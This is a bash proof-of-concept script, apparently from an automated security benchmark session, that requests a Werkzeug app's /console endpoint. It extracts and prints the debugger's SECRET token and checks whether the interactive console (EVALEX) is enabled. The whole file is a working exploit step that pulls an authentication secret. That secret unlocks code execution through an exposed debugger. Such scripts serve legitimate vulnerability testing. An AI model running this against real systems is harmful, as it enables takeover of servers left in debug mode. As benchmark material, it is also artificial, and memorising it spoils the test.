#!/bin/bash
# POC: Demonstrates disclosure of Werkzeug debugger SECRET token in HTML response from /console endpoint
# Target: ./repo
# Created: 2025-12-01T16:16:16.588Z
# Session: benchmark-XBEN-103-24-mincfo1r

# Werkzeug Debugger SECRET Token Disclosure POC
# This script demonstrates that the SECRET authentication token is exposed
# in the HTML response of the /console endpoint

TARGET="${1:-http://127.0.0.1:8000}"

echo "===== Werkzeug Debugger SECRET Token Disclosure POC ====="
echo "Target: $TARGET/console"
echo ""

# Make request to /console endpoint
echo "[*] Requesting $TARGET/console..."
RESPONSE=$(curl -s "$TARGET/console")

# Check if response contains the SECRET token in JavaScript
if echo "$RESPONSE" | grep -q "SECRET"; then
    echo "[+] SUCCESS: SECRET token found in response!"
    echo ""
    
    # Extract and display the SECRET value
    SECRET_VALUE=$(echo "$RESPONSE" | grep -oP 'SECRET\s*=\s*"?\K[^"]+' | head -1)
    
    if [ -n "$SECRET_VALUE" ]; then
        echo "[+] Extracted SECRET token: $SECRET_VALUE"
        echo ""
    fi
    
    # Show the vulnerable code snippet
    echo "[+] Vulnerable code snippet from HTML response:"
    echo "$RESPONSE" | grep -A 5 "var CONSOLE_MODE" || echo "$RESPONSE" | grep -B 2 -A 2 "SECRET"
    echo ""
    
    # Check for EVALEX setting
    if echo "$RESPONSE" | grep -q "EVALEX.*true"; then
        echo "[!] WARNING: EVALEX is enabled (interactive console available)"
    fi
    
    echo "[+] VULNERABILITY CONFIRMED: SECRET token is disclosed in client-side JavaScript"
    exit 0
else
    echo "[-] SECRET token not found in response"
    echo ""
    echo "[*] Response excerpt:"
    echo "$RESPONSE" | head -50
    exit 1
fi